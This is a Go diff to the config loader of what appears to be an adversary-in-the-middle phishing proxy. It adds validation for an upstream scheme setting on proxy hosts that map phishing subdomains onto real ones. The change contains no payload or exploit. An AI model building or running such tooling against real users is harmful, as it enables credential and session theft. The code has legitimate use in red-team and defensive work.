@@ -140,6 +140,19 @@ func (l *Loader) compileProxyHosts(path string, raw []rawProxyHost) ([]aitm.Prox
 		if rawHost.AutoFilter != nil {
 			autoFilter = *rawHost.AutoFilter
 		}
+		upstreamScheme := rawHost.UpstreamScheme
+		switch upstreamScheme {
+		case "", "https":
+			upstreamScheme = "https"
+		case "http":
+			// valid
+		default:
+			errs = append(errs, ParseError{
+				File:    path,
+				Field:   field + ".upstream_scheme",
+				Message: fmt.Sprintf("invalid scheme %q; must be http or https", upstreamScheme),
+			})
+		}
 		hosts = append(hosts, aitm.ProxyHost{
 			PhishSubdomain: rawHost.PhishSub,
 			OrigSubdomain:  rawHost.OrigSub,
@@ -147,6 +160,7 @@ func (l *Loader) compileProxyHosts(path string, raw []rawProxyHost) ([]aitm.Prox
 			IsLanding:      rawHost.IsLanding,
 			IsSession:      rawHost.IsSession,
 			AutoFilter:     autoFilter,
+			UpstreamScheme: upstreamScheme,
 		})
 	}
 	return hosts, errs
